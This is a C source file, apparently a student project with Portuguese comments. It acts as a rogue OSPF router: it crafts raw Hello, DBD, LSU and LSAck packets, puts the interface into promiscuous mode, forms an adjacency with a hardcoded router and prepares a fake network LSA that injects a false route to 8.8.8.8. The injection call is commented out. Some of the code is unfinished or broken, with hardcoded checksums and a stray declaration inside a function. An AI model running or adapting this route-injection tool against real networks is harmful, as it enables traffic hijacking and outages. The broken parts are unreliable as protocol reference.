#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <netpacket/packet.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <pthread.h>

#define MAC_ADDR_LEN 6
#define IP4_HDRLEN 20
#define BUFFER_LEN 1518
#define	OSPF_AUTH_SIZE	8

struct OSPF_HEADER {
    u_int8_t version;
    u_int8_t type;
    u_int16_t len;
    struct in_addr routerid;
    u_int32_t areaid;
    u_int16_t chksum;
    u_int16_t authtype;
    u_int8_t authdata[OSPF_AUTH_SIZE];
}__attribute__((__packed__));

struct HELLO_HEADER {
    struct in_addr mask;
    u_int16_t helloint;
    u_int8_t options;
    u_int8_t priority;
    u_int32_t deadint;
    struct in_addr dr;
    struct in_addr bdr;
    struct in_addr neighbor[1];
} __attribute__((__packed__));

struct DBD_HEADER {
	u_int16_t mtu;
	u_int8_t options;
	u_int8_t dbdescript;
	u_int32_t ddsequence;
}__attribute__((__packed__));

struct LLS_HEADER {
	u_int16_t checksum;
	u_int16_t len;
	u_int16_t type;
	u_int16_t optionsLen;
	u_int32_t options;
}__attribute__((__packed__));

struct LSA_HEADER_TRANSIT_ID {
    struct in_addr ip_designated_router;
    struct in_addr link_data;
    u_int8_t link_type;
    u_int8_t num_TOS;
    u_int16_t TOS;
}__attribute__((__packed__));

struct LSA_HEADER_ACK{
	u_int16_t age;
    u_int8_t options;
    u_int8_t type_lsa;
    struct in_addr link_state_id;
    struct in_addr adv_router;
    u_int32_t seq;
    u_int16_t chksum;
    u_int16_t len;
}__attribute__((__packed__));

struct LSA_HEADER_ROUTER {
	//
    u_int16_t age;
    u_int8_t options;
    u_int8_t type;
    struct in_addr stateid;
    struct in_addr router;
    u_int32_t seq;
    u_int16_t chksum;
    u_int16_t length;
    u_int8_t flags;
    u_int8_t dummy;
    u_int16_t num_links;
    struct LSA_HEADER_TRANSIT_ID transit1;
    /*struct LSA_HEADER_TRANSIT_ID transit2;*/
}__attribute__((__packed__));

struct LSA_HEADER_NETWORK {
    u_int16_t age;
    u_int8_t options;
    u_int8_t type;
    struct in_addr stateid;
    struct in_addr router;
    u_int32_t seq;
    u_int16_t chksum;
    u_int16_t length;
    u_int32_t netmask;
    struct in_addr r1;
    struct in_addr r2;
}__attribute__((__packed__));

struct LSU_HEADER {
	u_int32_t count;
	/*struct LSA_HEADER_ROUTER lsaRouter;*/
	struct LSA_HEADER_NETWORK lsaNetw;
}__attribute__((__packed__));

struct LSU_HEADER_2{
	uint32_t count;
	struct LSA_HEADER_ROUTER lsaRouter;
}__attribute__((__packed__));

struct OSPF_HEADER_CS {
    u_int8_t version;
    u_int8_t type;
    u_int16_t len;
    struct in_addr routerid;
    u_int32_t areaid;
    u_int16_t chksum;
    u_int16_t authtype;

	struct in_addr mask;
    u_int16_t helloint;
    u_int8_t options;
    u_int8_t priority;
    u_int32_t deadint;
    struct in_addr dr;
    struct in_addr bdr;
    struct in_addr neighbor[1];
}__attribute__((__packed__));

struct OSPF_HEADER_CS_DBD {
	u_int8_t version;
    u_int8_t type;
    u_int16_t len;
    struct in_addr routerid;
    u_int32_t areaid;
    u_int16_t chksum;
    u_int8_t authdata[OSPF_AUTH_SIZE];

	u_int16_t mtu;
	u_int8_t options;
	u_int8_t dbdescript;
	u_int32_t ddsequence;
};

struct OSPF_HEADER_CS_LSU {
	u_int8_t version;
    u_int8_t type;
    u_int16_t len;
    struct in_addr routerid;
    u_int32_t areaid;
    u_int16_t chksum;
    u_int8_t authdata[OSPF_AUTH_SIZE];

	u_int32_t count;
	/*struct LSA_HEADER_ROUTER lsaRouter;*/
	struct LSA_HEADER_NETWORK lsaNetw;
};

struct LSA_HEADER_ACK_CS {
	u_int8_t version;
    u_int8_t type;
    u_int16_t len;
    struct in_addr routerid;
    u_int32_t areaid;
    u_int16_t chksum;
    u_int8_t authdata[OSPF_AUTH_SIZE];

	u_int16_t age;
    u_int8_t options;
    u_int8_t type_lsa;
    struct in_addr link_state_id;
    struct in_addr adv_router;
    u_int32_t seq;
    u_int16_t chksumLSA;
    u_int16_t lenLSA;
}__attribute__((__packed__));

struct OSPF_HEADER_CS_LSU_ACK {
	u_int8_t version;
    u_int8_t type;
    u_int16_t len;
    struct in_addr routerid;
    u_int32_t areaid;
    u_int16_t chksum;
    u_int8_t authdata[OSPF_AUTH_SIZE];

	u_int32_t count;
	/*struct LSA_HEADER_ROUTER lsaRouter;*/
	struct LSA_HEADER_NETWORK lsaNetw;
};

/*
FIM DAS DEFINIÇÕES DAS STRUCTS
*/



struct ip ipHeader;
struct OSPF_HEADER ospf;
struct HELLO_HEADER hello;
struct DBD_HEADER dbdHeader;
struct LLS_HEADER llsHeader;
struct LSU_HEADER lsuHeader;
struct LSU_HEADER lsuHeaderInjection;
struct LSU_HEADER_2 lsuHeaderRouter;
struct LSA_HEADER_ACK lsuAck;
struct LSA_HEADER_ACK_CS lsuAckCs;
struct OSPF_HEADER_CS_LSU_ACK;
//struct LSA_HEADER lsaHeader;
struct OSPF_HEADER_CS ospCS;
struct OSPF_HEADER_CS_DBD ospCSDbd;
struct OSPF_HEADER_CS_LSU ospCSLsu;


typedef unsigned char MacAddress[MAC_ADDR_LEN];
unsigned char bufferMsg[BUFFER_LEN];
char buffer[BUFFER_LEN];

int socketRecebe;
struct ifreq ifr;

int socketEnvio = 0;
int retornoEnvio = 0;
struct sockaddr_ll destAddr;
short int etherTypeT;
int seqDbScript = 10000;
int status_adja = 0;

char* interfaceUtilizada = "eth0"; // hardcoded
char* ipLocal = "192.168.3.10";
char* ipBroadcast = "255.255.255.0";
char* ipMulticast = "224.0.0.5";
char* ipRoteador = "192.168.3.1";
u_int32_t seqAtual=0x00;

char* ipNetworkInjectionAddr = "8.8.8.0";
char* ipInjectionAddr = "8.8.8.8";



MacAddress macLocal = {0xa4, 0x1f, 0x72, 0xf5, 0x90, 0x80};
MacAddress macMulticast = {0x01, 0x00, 0x5e, 0x00, 0x00, 0x05};
MacAddress macRoteador = {0x50, 0x3d, 0xe5, 0xd9, 0x07, 0xb8};


/*
FIM DAS DEFINIÇÕES DAS VARIÁVEIS E CONSTANTES
*/

unsigned short CalculaChecksum(unsigned short *addr, int len)
{
	register int sum = 0;
	u_short answer = 0;
	register u_short *w = addr;
	register int nleft = len;

	while (nleft > 1)  {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1)
	{
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return(answer);
}

void MontarHeaderIp(char* ipDestino, int tamanhoMensagem)
{
	ipHeader.ip_len = htons (sizeof(llsHeader) + sizeof(ipHeader) + sizeof(ospf) + tamanhoMensagem);
	inet_pton (AF_INET, ipDestino, &(ipHeader.ip_dst));
	ipHeader.ip_id = htons (22227);
	ipHeader.ip_tos = 192;
	ipHeader.ip_sum = 0 ;
	ipHeader.ip_sum = CalculaChecksum ((uint16_t *) &ipHeader, IP4_HDRLEN);
}

void MontarHeaderOspf(int tipo, int tamanhoMensagem)
{
	ospf.type = tipo;
	ospCSDbd.type = ospf.type;
	ospf.len = htons(sizeof(ospf) + tamanhoMensagem);

	ospCSDbd.len = ospf.len;
	ospCSLsu.len = ospf.len;
	lsuAck.len = ospf.len;
}

void MontarDadosPadraoMensagem(MacAddress mac_L, MacAddress mac_D)
{
	memcpy(buffer, mac_D, MAC_ADDR_LEN);
	memcpy((buffer + MAC_ADDR_LEN), mac_L, MAC_ADDR_LEN);
	memcpy((buffer + (2 * MAC_ADDR_LEN)), &(etherTypeT), sizeof(etherTypeT));
	memcpy((buffer + (2 * MAC_ADDR_LEN)) + sizeof(etherTypeT), &ipHeader, IP4_HDRLEN);
	memcpy((buffer + (2 * MAC_ADDR_LEN)) + sizeof(etherTypeT) + IP4_HDRLEN, &ospf, sizeof(ospf));
}

void EnviaMensagemHello(MacAddress mac_L, MacAddress mac_D, int primeiraMensagem)
{
	memcpy(&(destAddr.sll_addr), mac_D, MAC_ADDR_LEN);

	MontarHeaderIp(ipMulticast, sizeof(hello));
	MontarHeaderOspf(1, sizeof(hello));

	// Configuração pacote Hello
	inet_pton (AF_INET, ipBroadcast, &(hello.mask));
	hello.helloint = htons(10);
	hello.options = 18;
	hello.priority = 1;
	hello.deadint = ntohl(40);

    // Na primeria mensagem não há roteador backup
	if(primeiraMensagem)
	{
		inet_pton (AF_INET, "0.0.0.0", &(hello.dr));
		inet_pton (AF_INET, "0.0.0.0", &(hello.bdr));
	}
	else
	{
		inet_pton (AF_INET, ipRoteador, &(hello.dr));
		inet_pton (AF_INET, ipLocal, &(hello.bdr));
	}
	inet_pton (AF_INET, ipRoteador, &(hello.neighbor[0]));

	MontarDadosPadraoMensagem(mac_L, mac_D);
	memcpy((buffer + (2 * MAC_ADDR_LEN)) + sizeof(etherTypeT) + IP4_HDRLEN + sizeof(ospf), &hello, sizeof(hello));
	memcpy((buffer + (2 * MAC_ADDR_LEN)) + sizeof(etherTypeT) + IP4_HDRLEN + sizeof(ospf) + sizeof(hello), &llsHeader, sizeof(llsHeader));

	// Envio da mensagem
	if((retornoEnvio = sendto(socketEnvio, buffer, 14 + sizeof(llsHeader) + IP4_HDRLEN + sizeof(ospf) + sizeof(hello),
		0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0)
	{
		printf("Mensagem Hello - Erro! \n");
		exit(1);
	}

	printf("Mensagem Hello - %d\n", retornoEnvio);
}

void EnviaMensagemDbd(MacAddress mac_L, MacAddress mac_D, int dbDescription)
{
	memcpy(&(destAddr.sll_addr), mac_D, MAC_ADDR_LEN);

	MontarHeaderIp(ipRoteador, sizeof(dbdHeader));
	MontarHeaderOspf(2, sizeof(dbdHeader));

	// Configuração pacote Bdb
	dbdHeader.ddsequence = htonl(seqDbScript);
	dbdHeader.dbdescript = dbDescription;

	seqDbScript++;

	ospCSDbd.ddsequence = dbdHeader.ddsequence;
	ospCSDbd.dbdescript = dbdHeader.dbdescript;

	ospf.chksum = CalculaChecksum ((uint16_t *) &ospCSDbd, sizeof(ospCSDbd));

	MontarDadosPadraoMensagem(mac_L, mac_D);
	memcpy((buffer + (2 * MAC_ADDR_LEN)) + sizeof(etherTypeT) + IP4_HDRLEN + sizeof(ospf), &dbdHeader, sizeof(dbdHeader));
	memcpy((buffer + (2 * MAC_ADDR_LEN)) + sizeof(etherTypeT) + IP4_HDRLEN + sizeof(ospf) + sizeof(dbdHeader), &llsHeader, sizeof(llsHeader));

	// Envio da mensagem
	if((retornoEnvio = sendto(socketEnvio, buffer, 14 + sizeof(llsHeader) + IP4_HDRLEN + sizeof(ospf) + sizeof(dbdHeader), 0,
		(struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0)
	{
		printf("Mensagem Bdb - Erro! \n");
		exit(1);
	}

	printf("Mensagem Dbd - %d\n", retornoEnvio);
}


void EnviaMensagemLsuRouter(MacAddress mac_L, MacAddress mac_D)
{
	memcpy(&(destAddr.sll_addr), mac_D, MAC_ADDR_LEN);

	MontarHeaderIp(ipRoteador, sizeof(lsuHeaderRouter));
	MontarHeaderOspf(4, sizeof(lsuHeaderRouter));

    lsuHeaderRouter.lsaRouter.seq = htonl(seqDbScript); // incrementar
    lsuHeaderRouter.lsaRouter.chksum = htons(0); // vai saber

	seqDbScript;


	ospf.chksum = 0xefdd;//CalculaChecksum ((uint16_t *) &ospCSLsu, sizeof(ospCSLsu));

	MontarDadosPadraoMensagem(mac_L, mac_D);
	memcpy((buffer + (2 * MAC_ADDR_LEN)) + sizeof(etherTypeT) + IP4_HDRLEN + sizeof(ospf), &lsuHeaderRouter, sizeof(lsuHeaderRouter));
	memcpy((buffer + (2 * MAC_ADDR_LEN)) + sizeof(etherTypeT) + IP4_HDRLEN + sizeof(ospf) + sizeof(lsuHeaderRouter), &llsHeader, sizeof(llsHeader));

	// Envio da mensagem
	if((retornoEnvio = sendto(socketEnvio, buffer, 14 + IP4_HDRLEN + sizeof(ospf) + sizeof(lsuHeaderRouter) + sizeof(llsHeader), 0,
		(struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0)
	{
		printf("Mensagem Lsu - Erro! \n");
		exit(1);
	}

	printf("-----------------------Mensagem Lsu Router------------------------ %d\n", retornoEnvio);
}
void EnviaMensagemLsuNetwork(MacAddress mac_L, MacAddress mac_D)
{
	memcpy(&(destAddr.sll_addr), mac_D, MAC_ADDR_LEN);

	MontarHeaderIp(ipRoteador, sizeof(lsuHeader));
	MontarHeaderOspf(4, sizeof(lsuHeader));

    /*lsuHeader.lsaRouter.seq = htonl(seqDbScript); // incrementar
    lsuHeader.lsaRouter.chksum = htons(0); // vai saber*/

	seqDbScript++;

    lsuHeader.lsaNetw.seq = htonl(seqDbScript); // incrementar
    lsuHeader.lsaNetw.chksum = htons(0); // vai saber

	seqDbScript++;

    ospCSLsu.lsaNetw.seq = lsuHeader.lsaNetw.seq; // incrementar
    ospCSLsu.lsaNetw.chksum = lsuHeader.lsaNetw.chksum; // vai saber

	ospf.chksum = 0xf7e2;//CalculaChecksum ((uint16_t *) &ospCSLsu, sizeof(ospCSLsu));

	MontarDadosPadraoMensagem(mac_L, mac_D);
	memcpy((buffer + (2 * MAC_ADDR_LEN)) + sizeof(etherTypeT) + IP4_HDRLEN + sizeof(ospf), &lsuHeader, sizeof(lsuHeader));
	memcpy((buffer + (2 * MAC_ADDR_LEN)) + sizeof(etherTypeT) + IP4_HDRLEN + sizeof(ospf) + sizeof(lsuHeader), &llsHeader, sizeof(llsHeader));

	// Envio da mensagem
	if((retornoEnvio = sendto(socketEnvio, buffer, 14 + IP4_HDRLEN + sizeof(ospf) + sizeof(lsuHeader) + sizeof(llsHeader), 0,
		(struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0)
	{
		printf("Mensagem Lsu - Erro! \n");
		exit(1);
	}

	printf("-----------------------Mensagem Lsu Network------------------------ %d\n", retornoEnvio);
}

void EnviaMensagemLsuInjection(MacAddress mac_L, MacAddress mac_D)
{
	memcpy(&(destAddr.sll_addr), mac_D, MAC_ADDR_LEN);

	MontarHeaderIp(ipRoteador, sizeof(lsuHeaderInjection));
	MontarHeaderOspf(4, sizeof(lsuHeaderInjection));

    /*lsuHeader.lsaRouter.seq = htonl(seqDbScript); // incrementar
    lsuHeader.lsaRouter.chksum = htons(0); // vai saber*/

	seqDbScript++;

    lsuHeaderInjection.lsaNetw.seq = htonl(seqDbScript); // incrementar
    lsuHeaderInjection.lsaNetw.chksum = htons(0); // vai saber

	seqDbScript++;

    ospCSLsu.lsaNetw.seq = lsuHeaderInjection.lsaNetw.seq; // incrementar
    ospCSLsu.lsaNetw.chksum = lsuHeaderInjection.lsaNetw.chksum; // vai saber

	ospf.chksum = 0xf7e2;//CalculaChecksum ((uint16_t *) &ospCSLsu, sizeof(ospCSLsu));

	MontarDadosPadraoMensagem(mac_L, mac_D);
	memcpy((buffer + (2 * MAC_ADDR_LEN)) + sizeof(etherTypeT) + IP4_HDRLEN + sizeof(ospf), &lsuHeaderInjection, sizeof(lsuHeaderInjection));
	memcpy((buffer + (2 * MAC_ADDR_LEN)) + sizeof(etherTypeT) + IP4_HDRLEN + sizeof(ospf) + sizeof(lsuHeaderInjection), &llsHeader, sizeof(llsHeader));

	// Envio da mensagem
	if((retornoEnvio = sendto(socketEnvio, buffer, 14 + IP4_HDRLEN + sizeof(ospf) + sizeof(lsuHeaderInjection) + sizeof(llsHeader), 0,
		(struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0)
	{
		printf("Mensagem Lsu - Erro! \n");
		exit(1);
	}

	printf("-----------------------Mensagem Lsu Network------------------------ %d\n", retornoEnvio);
}

void EnviaMensagemLsuAck(MacAddress mac_L, MacAddress mac_D)
{
	memcpy(&(destAddr.sll_addr), mac_D, MAC_ADDR_LEN);

	MontarHeaderIp(ipRoteador, sizeof(lsuAck));
	MontarHeaderOspf(5, sizeof(lsuAck));

    lsuAck.chksum = htons(0); // vai saber
    lsuAckCs.chksumLSA = htons(0); // vai saber

	//seqDbScript++;
    lsuAck.seq = seqAtual;
    lsuAckCs.seq = seqAtual;

	ospf.chksum = CalculaChecksum ((uint16_t *) &lsuAckCs, sizeof(lsuAckCs));

	MontarDadosPadraoMensagem(mac_L, mac_D);
	memcpy((buffer + (2 * MAC_ADDR_LEN)) + sizeof(etherTypeT) + IP4_HDRLEN + sizeof(ospf), &lsuAck, sizeof(lsuAck));
	memcpy((buffer + (2 * MAC_ADDR_LEN)) + sizeof(etherTypeT) + IP4_HDRLEN + sizeof(ospf) + sizeof(lsuAck), &llsHeader, sizeof(llsHeader));

	// Envio da mensagem
	if((retornoEnvio = sendto(socketEnvio, buffer, 14 + IP4_HDRLEN + sizeof(ospf) + sizeof(lsuAck) + sizeof(llsHeader), 0,
		(struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0)
	{
		printf("Mensagem Lsu - Erro! \n");
		exit(1);
	}

	printf("-----------------------Mensagem Lsu--------------------- - %d\n", retornoEnvio);
}

void* ReceberPacotes(void* g)
{
    if((socketRecebe = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
       printf("Erro na criacao do socket.\n");
       exit(1);
    }

    // Interface fixa
    strcpy(ifr.ifr_name, interfaceUtilizada);

    if(ioctl(socketRecebe, SIOCGIFINDEX, &ifr) < 0)
    	printf("Erro no ioctl!");

    ioctl(socketRecebe, SIOCGIFFLAGS, &ifr);
    ifr.ifr_flags |= IFF_PROMISC;
    ioctl(socketRecebe, SIOCSIFFLAGS, &ifr);

    // Recepção de pacotes
    int msgSucesso = 0;
    while (!msgSucesso)
	{
        recv(socketRecebe,(char *) &bufferMsg, sizeof(bufferMsg), 0x0);

        if(bufferMsg[26] == 192 && bufferMsg[27] == 168
            && bufferMsg[28] == 3 && bufferMsg[29] == 1)
        {
            if(bufferMsg[23] == 89)
            {
                if(bufferMsg[35] == 1)
                {
                    if(bufferMsg[30] == 192 && bufferMsg[31] == 168
                        && bufferMsg[32] == 3 && bufferMsg[33] == 10)
                    {
                        status_adja = 2;
                    }
                }
                else if(bufferMsg[35] == 2)
                {
                    if(bufferMsg[61] == 7)
                        status_adja = 1;
                    else if(bufferMsg[61] == 2)
                        status_adja = 3;
                    else if(bufferMsg[61] == 0)
                        status_adja = 4;
                }
                else if(bufferMsg[35] == 4)
                {
                    seqAtual = (bufferMsg[77] << 24) | (bufferMsg[76] << 16) | (bufferMsg[75] << 8) | bufferMsg[74];

                    EnviaMensagemLsuAck(macLocal, macRoteador);
                }
            }
        }
    }
}

void ConfiguracoesIniciais()
{
	etherTypeT = htons(0x0800);

	// Configuração inicial
	destAddr.sll_family = htons(PF_PACKET);
	destAddr.sll_protocol = htons(ETH_P_ALL);
	destAddr.sll_halen = 6;
	destAddr.sll_ifindex = 2;
	memcpy(&(destAddr.sll_addr), macMulticast, MAC_ADDR_LEN);

	// Configuração inicial IP
	ipHeader.ip_v = 4;
	ipHeader.ip_hl = IP4_HDRLEN / sizeof (uint32_t);
	ipHeader.ip_tos = ipHeader.ip_off = ipHeader.ip_sum = 0;
	ipHeader.ip_len = htons (sizeof(llsHeader) + sizeof(ipHeader) + sizeof(ospf) + sizeof(hello));
	ipHeader.ip_id = htons (0);
	ipHeader.ip_ttl = 1;
	ipHeader.ip_p = 89;
	inet_pton (AF_INET, ipLocal, &(ipHeader.ip_src));
	inet_pton (AF_INET, ipMulticast, &(ipHeader.ip_dst));
	ipHeader.ip_sum = CalculaChecksum ((uint16_t *) &ipHeader, IP4_HDRLEN);

	// Configuração inicial OSPF
	ospf.version = 2;
	ospf.type = 1;
	ospf.len = htons (sizeof(ospf) + sizeof(hello));
	inet_pton (AF_INET, ipLocal, &(ospf.routerid));
	ospf.areaid = ospf.chksum = ospf.authtype = 0;
	ospf.authdata[0] = ospf.authdata[1] = ospf.authdata[2] = ospf.authdata[3] = 0;
	ospf.authdata[4] = ospf.authdata[5] = ospf.authdata[6] = ospf.authdata[7] = 0;

	// Configuração inicial OSPF HELLO
	inet_pton (AF_INET, ipBroadcast, &(hello.mask));
	hello.helloint = htons(10);
	hello.options = 18;
	hello.priority = 1;
	hello.deadint = ntohl(40);
	inet_pton (AF_INET, "0.0.0.0", &(hello.dr));
	inet_pton (AF_INET, "0.0.0.0", &(hello.bdr));
	inet_pton (AF_INET, ipRoteador, &(hello.neighbor[0]));

	// Configuração inicial LLS
	llsHeader.checksum = htons(65526);
	llsHeader.len = htons(3);
	llsHeader.type = llsHeader.options = htons(1);
	llsHeader.optionsLen = htons(4);

	// Configuração inicial DBD
	dbdHeader.mtu = htons(1500);
	dbdHeader.options = 82;
	dbdHeader.dbdescript = 7;
	dbdHeader.ddsequence = ntohl(seqDbScript);

	// Configuração inicial LSU
	lsuHeader.count = ntohl(1);


    //LSU HEADER NETWORK
    lsuHeader.lsaNetw.age = htons(24);
    lsuHeader.lsaNetw.options = 34;
    lsuHeader.lsaNetw.type = 2;
    inet_pton (AF_INET, ipLocal, &(lsuHeader.lsaNetw.stateid));
    inet_pton (AF_INET, ipLocal, &(lsuHeader.lsaNetw.router));
    lsuHeader.lsaNetw.seq = htonl(0); // incrementar
    lsuHeader.lsaNetw.chksum = htons(0); // vai saber
    lsuHeader.lsaNetw.length = htons(32); // saberá na hora
    inet_pton (AF_INET, ipBroadcast, &(lsuHeader.lsaNetw.netmask));
    inet_pton (AF_INET, ipLocal, &(lsuHeader.lsaNetw.r1));
    inet_pton (AF_INET, ipRoteador, &(lsuHeader.lsaNetw.r2));


    //LSU HEADER ROUTER
	lsuHeaderRouter.count = ntohl(1);


    lsuHeaderRouter.lsaRouter.age = htons(24);
    lsuHeaderRouter.lsaRouter.options = 34;
    lsuHeaderRouter.lsaRouter.type = 1;
    inet_pton (AF_INET, ipLocal, &(lsuHeaderRouter.lsaRouter.stateid));
    inet_pton (AF_INET, ipLocal, &(lsuHeaderRouter.lsaRouter.router));
    lsuHeaderRouter.lsaRouter.seq = htonl(0); // incrementar
    lsuHeaderRouter.lsaRouter.chksum = htons(0); // vai saber
    lsuHeaderRouter.lsaRouter.length = htons(36); // saberá na hora
    lsuHeaderRouter.lsaRouter.flags = 0x02;
    lsuHeaderRouter.lsaRouter.dummy = 0x00;
    lsuHeaderRouter.lsaRouter.num_links = htons(0x01);
	inet_pton (AF_INET, ipRoteador, &(lsuHeaderRouter.lsaRouter.transit1.ip_designated_router));
    inet_pton (AF_INET, ipLocal, &(lsuHeaderRouter.lsaRouter.transit1.link_data));
    lsuHeaderRouter.lsaRouter.transit1.link_type = 2;
    lsuHeaderRouter.lsaRouter.transit1.num_TOS = 0;
    lsuHeaderRouter.lsaRouter.transit1.TOS = htons(0);

	uint32_t num_links;
	u_int16_t age;
    u_int8_t options;
    u_int8_t type_lsa;
    struct in_addr link_state;
    struct in_addr adv_router;
    u_int32_t seq;
    u_int16_t chksum_ack;
    u_int16_t len_ack;

    //LSU HEADER ACK
    //lsuAck.num_links =
    lsuAck.age = htons(24);
    lsuAck.options = 34;
    lsuAck.type_lsa = 0x01;
    inet_pton (AF_INET, ipLocal, &(lsuAck.link_state_id));
    inet_pton (AF_INET, ipLocal, &(lsuAck.adv_router));
    lsuAck.seq = htonl(0); // incrementar
    lsuAck.chksum = htons(0); // vai saber
    lsuAck.len = htons(20); // saberá na hora
    lsuAck.type_lsa = 0x01;

    //LSU NETWORK INJETANDO ROTA FALSA
    lsuHeaderInjection.lsaNetw.age = htons(24);
    lsuHeaderInjection.lsaNetw.options = 34;
    lsuHeaderInjection.lsaNetw.type = 2;
    inet_pton (AF_INET, ipInjectionAddr, &(lsuHeaderInjection.lsaNetw.stateid));
    inet_pton (AF_INET, ipLocal, &(lsuHeaderInjection.lsaNetw.router));
    lsuHeaderInjection.lsaNetw.seq = htonl(0); // incrementar
    lsuHeaderInjection.lsaNetw.chksum = htons(0); // vai saber
    lsuHeaderInjection.lsaNetw.length = htons(32); // saberá na hora
    inet_pton (AF_INET, ipBroadcast, &(lsuHeaderInjection.lsaNetw.netmask));
    inet_pton (AF_INET, ipInjectionAddr, &(lsuHeaderInjection.lsaNetw.r1));


char* ipNetworkInjectionAddr = "8.8.8.0";
char* ipInjectionAddr = "8.8.8.8";



	// Configurações para cálculo do checksum do ospf
	ospCS.version = ospf.version;
	ospCS.type = ospf.type;
	ospCS.len = ospf.len;
	ospCS.routerid = ospf.routerid;
	ospCS.areaid = ospf.areaid;
	ospCS.authtype = ospf.authtype;
	ospCS.mask = hello.mask;
	ospCS.helloint = hello.helloint;
	ospCS.options = hello.options;
	ospCS.priority = hello.priority;
	ospCS.deadint = hello.deadint;
	ospCS.dr = hello.dr;
	ospCS.bdr = hello.bdr;
	ospCS.neighbor[0] = hello.neighbor[0];

	ospCSDbd.version = ospf.version;
	ospCSDbd.type = ospf.type;
	ospCSDbd.len = ospf.len;
	ospCSDbd.routerid = ospf.routerid;
	ospCSDbd.areaid = ospf.areaid;
	ospCSDbd.authdata[0] = ospCSDbd.authdata[1] = ospCSDbd.authdata[2] = 0;
	ospCSDbd.authdata[3] = ospCSDbd.authdata[4] = ospCSDbd.authdata[5] = 0;
	ospCSDbd.authdata[6] = ospCSDbd.authdata[7] = 0;

	ospCSDbd.mtu = dbdHeader.mtu;
	ospCSDbd.options = dbdHeader.options;
	ospCSDbd.dbdescript = dbdHeader.dbdescript;
	ospCSDbd.ddsequence = dbdHeader.ddsequence;

    // LSU Check
	ospCSLsu.type = ospf.type;
	ospCSLsu.len = ospf.len;
	ospCSLsu.routerid = ospf.routerid;
	ospCSLsu.areaid = ospf.areaid;
	ospCSLsu.chksum = ospf.chksum;
	ospCSLsu.authdata[0] = ospCSLsu.authdata[1] = ospCSLsu.authdata[2] = ospCSLsu.authdata[3] = 0;
	ospCSLsu.authdata[4] = ospCSLsu.authdata[5] = ospCSLsu.authdata[6] = ospCSLsu.authdata[7] = 0;

	ospCSLsu.count = lsuHeader.count;

    ospCSLsu.lsaNetw.age = lsuHeader.lsaNetw.age;
    ospCSLsu.lsaNetw.options = lsuHeader.lsaNetw.options;
    ospCSLsu.lsaNetw.type = lsuHeader.lsaNetw.type;
    ospCSLsu.lsaNetw.stateid = lsuHeader.lsaNetw.stateid;
    ospCSLsu.lsaNetw.router = lsuHeader.lsaNetw.router;
    ospCSLsu.lsaNetw.seq = lsuHeader.lsaNetw.seq; // incrementar
    ospCSLsu.lsaNetw.chksum = lsuHeader.lsaNetw.chksum; // vai saber
    ospCSLsu.lsaNetw.length = lsuHeader.lsaNetw.length; // saberá na hora
    ospCSLsu.lsaNetw.netmask = lsuHeader.lsaNetw.netmask;
    ospCSLsu.lsaNetw.r1 = lsuHeader.lsaNetw.r1;
    ospCSLsu.lsaNetw.r2 = lsuHeader.lsaNetw.r1;

	lsuAckCs.type = ospf.type;
	lsuAckCs.len = ospf.len;
	lsuAckCs.routerid = ospf.routerid;
	lsuAckCs.areaid = ospf.areaid;
	lsuAckCs.chksum = ospf.chksum;
	lsuAckCs.authdata[0] = lsuAckCs.authdata[1] = lsuAckCs.authdata[2] = lsuAckCs.authdata[3] = 0;
	lsuAckCs.authdata[4] = lsuAckCs.authdata[5] = lsuAckCs.authdata[6] = lsuAckCs.authdata[7] = 0;

    lsuAckCs.age = lsuAck.age;
    lsuAckCs.options = lsuAck.options;
    lsuAckCs.type_lsa = lsuAck.type_lsa;
    lsuAckCs.link_state_id = lsuAck.link_state_id;
    lsuAckCs.adv_router = lsuAck.adv_router;
    lsuAckCs.seq = lsuAck.seq; // incrementar
    lsuAckCs.chksumLSA = lsuAck.chksum; // vai saber
    lsuAckCs.lenLSA = lsuAck.len; // saberá na hora
    lsuAckCs.type_lsa = lsuAck.type_lsa;


	ospf.chksum = CalculaChecksum ((uint16_t *) &ospCS, sizeof(ospCS));
}


void* EnviaHello(void* c){
    do{
        sleep(10);
        EnviaMensagemHello(macLocal, macMulticast, 0);
    }while(1);
}
/*

Função Main

*/
int main()
{
	if((socketEnvio = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		printf("Erro na criacao do socket.\n");
		exit(1);
	}

	ConfiguracoesIniciais();

	pthread_t recv_thread;
	pthread_create(&recv_thread, NULL, ReceberPacotes, NULL);

	while(1)
	{
        if(status_adja == 0)
        {
            EnviaMensagemHello(macLocal, macMulticast, 1);
        }
        else if(status_adja == 1)
        {
            EnviaMensagemDbd(macLocal, macRoteador, 7);
        }
        else if(status_adja == 2)
        {
            EnviaMensagemDbd(macLocal, macRoteador, 3);
        }
        else if(status_adja == 3)
        {
            EnviaMensagemDbd(macLocal, macRoteador, 1);
        }
        else if(status_adja == 4)
        {
        	//EnviaMensagemLsuAck(macLocal, macRoteador);
            EnviaMensagemLsuNetwork(macLocal, macRoteador);
            sleep(2);
            EnviaMensagemLsuRouter(macLocal, macRoteador);
            sleep(2);
            EnviaMensagemLsuAck(macLocal, macRoteador);
            //sleep(5);
            //EnviaMensagemLsuInjection(macLocal, macRoteador);
            //Depois tem que fazer o injection
            break;

        }
        else if(status_adja == 5)
        {
            break;
        }

        sleep(1);
	}

    pthread_t send_hello;
    pthread_create(&send_hello, NULL, EnviaHello, NULL);

	pthread_join(send_hello, NULL);
	pthread_join(recv_thread, NULL);
}
